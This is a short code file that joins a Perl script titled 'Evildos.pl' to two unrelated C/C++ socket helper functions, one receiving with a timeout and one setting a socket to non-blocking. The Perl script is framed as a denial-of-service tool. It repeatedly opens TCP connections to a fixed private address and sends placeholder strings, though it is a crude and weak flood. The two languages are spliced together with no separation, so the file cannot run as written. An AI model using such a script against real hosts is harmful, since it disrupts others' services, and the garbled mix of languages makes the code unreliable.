//CESARVERSATII

#Evildos.pl
use strict;
use Socket;
use IO::Handle;
sub dosfunction
{
my $host = shift || '192.168.4.21';
my $port = 1234;
my $firststr = 'firststr';
my $secondstr = 'secondstr';
my $protocol = getprotobyname('tcp');
$host = inet_aton($host) or die "$host: unknown host";
socket(SOCK, AF_INET, SOCK_STREAM, $protocol) or die "socket() failed: $!";
my $dest_addr = sockaddr_in($port,$host);
connect(SOCK,$dest_addr) or die "connect() failed: $!";
SOCK->autoflush(1);
print SOCK $firststr;
#sleep(1);
print SOCK $secondstr;
#sleep(1);
close SOCK;
}

my $i;
for($i=0; $i<30;$i++)
{
&dosfunction;
}
int recvtimeout(int s, char *buf, int len, int timeout)
     {


fd_set fds;
int n;
struct timeval tv;
// set up the file descriptor set
FD_ZERO(&fds);
FD_SET(s, &fds);
// set up the struct timeval for the timeout
tv.tv_sec = timeout;
tv.tv_usec = 0;
// wait until timeout or data received
n = select(s+1, &fds, NULL, NULL, &tv);
if (n == 0){
    return -2; // timeout!
}
if (n == -1){
    return -1; // error
}
// data must be here, so do a normal recv()
return recv(s, buf, len, 0);
    }
int SetNonBlocking(int sock)
{
    int result = -1;
    int flags = 0;

    flags = ::fcntl(sock, F_GETFL, 0);
    if (flags != -1)
    {
        flags |= O_NONBLOCK;
        result = fcntl(sock , F_SETFL , flags);
    }
    return result;
}
